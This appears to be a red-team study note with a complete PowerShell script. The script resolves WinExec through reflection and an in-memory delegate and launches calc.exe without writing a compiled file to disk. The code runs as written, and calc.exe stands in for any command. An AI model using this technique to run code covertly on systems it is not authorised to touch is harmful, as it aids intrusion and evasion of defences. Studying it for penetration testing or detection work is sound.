---
title: Reflection WinExec Example
layout: default
parent: Reflection Shellcode
grand_parent: Client Side Execution
nav_order: 4
---

Very similar to the previous example of MessageBox, basically just need to change return type/argument type.

```powershell
function LookupFunc {
  Param ($moduleName, $functionName)
  $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
  Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
    Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
  $tmp=@()
  $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
  return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
@($moduleName)), $functionName))
}

$WinExec = LookupFunc kernel32.dll WinExec
$MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
$Domain = [AppDomain]::CurrentDomain
$MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
$MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @([String], [uint32]))
$MyConstructorBuilder.SetImplementationFlags('Runtime, Managed')
$MyMethodBuilder = $MyTypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', [uint32], @([String], [uint32]))
$MyMethodBuilder.SetImplementationFlags('Runtime, Managed')
$MyDelegateType = $MyTypeBuilder.CreateType()
$MyFunction = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WinExec, $MyDelegateType)
$MyFunction.Invoke("calc.exe", 1)
```
